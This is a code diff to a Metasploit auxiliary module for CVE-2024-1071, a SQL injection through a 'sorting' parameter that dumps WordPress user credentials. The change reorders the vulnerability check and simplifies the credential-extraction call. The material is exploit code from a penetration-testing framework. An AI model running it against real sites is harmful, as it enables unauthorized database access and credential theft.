@@ -99,7 +99,7 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::NotFound, "Could not find a valid directory id within the range #{min_range} to #{max_range}")
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     print_status("Performing SQL injection for CVE-2024-1071 via the 'sorting' parameter...")
 
     nonce = get_nonce
@@ -123,19 +123,11 @@ class MetasploitModule < Msf::Auxiliary
         fail_with(Failure::Unreachable, 'Connection failed') unless res
       end
 
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable or delay is too short.') unless @sqli.test_vulnerable
+      print_good('Target is vulnerable to SQLi!')
+
       wordpress_sqli_initialize(@sqli)
-
-      unless @sqli.test_vulnerable
-        fail_with(Failure::NotVulnerable, 'Target is not vulnerable or delay is too short.')
-      end
-
-      table_prefix = wordpress_sqli_identify_table_prefix
-      unless table_prefix
-        fail_with(Failure::NotFound, 'Failed to identify the WordPress table prefix.')
-      end
-
-      wordpress_sqli_get_users_credentials(table_prefix, ip, datastore['COUNT'])
-
+      wordpress_sqli_get_users_credentials(datastore['COUNT'])
     else
       fail_with(Failure::NotFound, 'Failed to retrieve nonce or directory_id')
     end
